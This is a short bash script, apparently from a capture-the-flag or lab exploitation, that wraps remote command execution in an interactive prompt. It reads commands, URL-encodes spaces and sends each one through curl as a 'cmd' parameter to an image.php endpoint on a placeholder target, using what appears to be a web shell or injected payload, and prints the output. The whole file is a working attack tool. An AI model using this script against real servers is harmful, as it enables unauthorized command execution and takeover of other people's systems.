#!/bin/bash

function ctrl_C(){
        echo -e "\n[!]Saliendo...\n"
        exit 1
}

trap ctrl_C INT

while true; do

        echo -n "[~]> " && read -r comando
        comando=$(echo "$comando" | sed "s/ /+/g")
        echo; curl -s -X GET "http://<TARGET_IP>/image.php?img=<PATH_TO_IMAGE>&cmd=$comando" | html2text; echo

done
